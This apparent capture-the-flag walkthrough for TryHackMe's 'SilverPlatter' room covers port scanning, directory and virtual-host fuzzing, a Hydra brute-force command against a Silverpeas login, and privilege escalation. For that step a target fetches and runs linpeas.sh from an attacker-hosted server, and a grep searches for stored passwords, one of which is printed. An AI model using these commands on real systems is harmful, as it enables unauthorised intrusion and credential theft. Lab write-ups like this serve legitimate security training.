# SilverPlatter Enumeration & Exploitation Walkthrough

## Adding the IP to `/etc/hosts`
To avoid repeatedly typing the IP address, add it to the hosts file:
```bash
sudo nano /etc/hosts
[IP] silverplatter.thm
```

## Network Scanning
### Full Port Scan
```bash
nmap -p- silverplatter.thm -T5 -v
```
### Targeted Service Scan
```bash
nmap -p 22,80,8080 -A silverplatter.thm -v
```

**Scan Results:**
- **SSH (22)**: OpenSSH 8.9p1 (Ubuntu Linux)
- **HTTP (80)**: nginx 1.18.0 (Ubuntu)
- **HTTP Proxy (8080)**: Running unknown service

## RustScan Installation & Usage
Download and unzip RustScan:
```bash
cd ~/Downloads
unzip rustscan-2.3.0-x86_64-linux.zip
```
Move RustScan to a system-wide location:
```bash
sudo mv rustscan /usr/local/bin
```
Run RustScan:
```bash
cd ~/intro/silver
rustscan -a silverplatter.thm -- -A
```

## Web Application Enumeration
### SSH (22)
```bash
ssh root@silverplatter.thm
```
- SSH uses password-based authentication.

### HTTP (80) - Directory Enumeration
Install and run `dirsearch`:
```bash
pipx install dirsearch
dirsearch -u http://silverplatter.thm
```
**Findings:**
- `/assets/` (403 Forbidden)
- `/images/` (403 Forbidden)
- `/LICENSE.txt` (200 OK)
- `/README.txt` (200 OK)

### Virtual Host Enumeration
Download and run the `vhost-fuzzer.sh` script:
```bash
nano vhost-fuzzer.sh
chmod +x vhost-fuzzer.sh
./vhost-fuzzer.sh silverplatter.thm /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://silverplatter.thm 1
```

## Web Enumeration - Burp Suite
Load `http://silverplatter.thm` in Burp Suite and analyze requests.
- **Software Identified:** Silverpeas
- **Username Enumeration:** `scr1ptkiddy`

## HTTP (8080) - Custom Password List
Create a custom password list using `cewl`:
```bash
cewl http://silverplatter.thm > custom_passwords.txt
```
Crack passwords using Turbo Intruder in Burp Suite.

### Hydra Brute Force Attack
```bash
hydra -l scr1ptkiddy -P custom_passwords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:Login or password incorrect" -V -t 2
```

## Post-Exploitation - Privilege Escalation
### Checking User Privileges
```bash
sudo -l
```
### Exploring Interesting Files & Folders
```bash
cd /
ls -la
cd /opt
ls -la
cd /var
ls -la
```

### Privilege Escalation Checklist
```bash
uname -a
cat /etc/issue
```

### Using Linpeas for Enumeration
Download and execute `linpeas.sh`:
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```
On the target machine:
```bash
cd /tmp
wget http://[attacker_ip]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Searching for Stored Credentials
```bash
grep -ir "password"
```
**Found Password:** `*_Zd*zx7N823/`

## Next Steps
Congratulations on completing this enumeration and exploitation walkthrough!

### Recommended Resources:
- [TryHackMe](https://tryhackme.com/)
- [Hack The Box](https://app.hackthebox.com/)
- [VulnLab](https://vulnlab.com/)
- [PwnedLabs](https://pwnedlabs.io/)
- [Tyler Ramsbey's YouTube](https://youtube.com/@TylerRamsbey)

Join cybersecurity communities for discussions and learning:
- [Hack Smarter Discord](https://discord.gg/hacksmarter)
- [Simply Cyber Discord](https://discord.gg/simplycyber)

Happy Hacking! 🚀

